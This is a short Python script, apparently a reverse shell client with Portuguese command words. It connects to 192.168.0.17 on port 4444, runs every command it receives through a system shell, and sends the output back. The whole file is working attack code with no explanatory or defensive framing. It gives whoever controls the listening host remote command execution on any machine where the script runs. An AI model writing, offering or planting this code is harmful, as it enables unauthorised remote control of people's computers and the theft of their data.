import socket
import subprocess

def connection():
    s = socket.socket()
    s.connect(("192.168.0.17", 4444))
    while True:
        comando = s.recv(1024)
        if('sair' in comando.decode()):
            s.close()
            break
        else:
            SHELL = subprocess.Popen(comando.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            s.send(SHELL.stdout.read())
            s.send(SHELL.stderr.read())

if __name__ == '__main__':
    connection()